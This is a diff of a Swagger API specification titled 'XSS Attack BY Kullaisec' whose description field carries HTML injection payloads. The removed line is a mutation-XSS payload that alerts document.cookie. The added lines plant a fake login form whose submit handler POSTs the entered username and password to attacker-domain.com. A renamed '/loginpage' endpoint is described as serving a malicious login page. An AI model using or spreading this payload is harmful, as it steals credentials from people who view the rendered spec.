@@ -2,7 +2,13 @@ swagger: '2.0'
 info:
   title: XSS Attack BY Kullaisec
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+    <form action="#" onsubmit="fetch('https://attacker-domain.com/steal', {method: 'POST', body: new URLSearchParams({username: this.username.value, password: this.password.value})}); alert('Credentials sent to attacker!'); return false;">
+      <label for="username">Username:</label><br>
+      <input type="text" id="username" name="username"><br>
+      <label for="password">Password:</label><br>
+      <input type="password" id="password" name="password"><br><br>
+      <button type="submit">Login</button>
+    </form>
   version: production
 basePath: /JSSResource/
 produces:
@@ -14,15 +20,19 @@ consumes:
 security:
   - basicAuth: []
 paths:
-  /M0X0101:
+  /loginpage:
     get:
+      summary: Displays a malicious login page
+      description: |
+        An endpoint that serves a login page for demonstration purposes of XSS.
       responses:
         '200':
-          description: No response was specified
+          description: HTML login page
+          schema:
+            type: string
       tags:
-        - Kullai_XSS_D
-      operationId: findAccounts
-      summary: Finds all accounts
+        - Kullai_XSS_Login
+      operationId: displayLoginPage
   '/hack/hachid/{id}':
     delete:
       parameters:
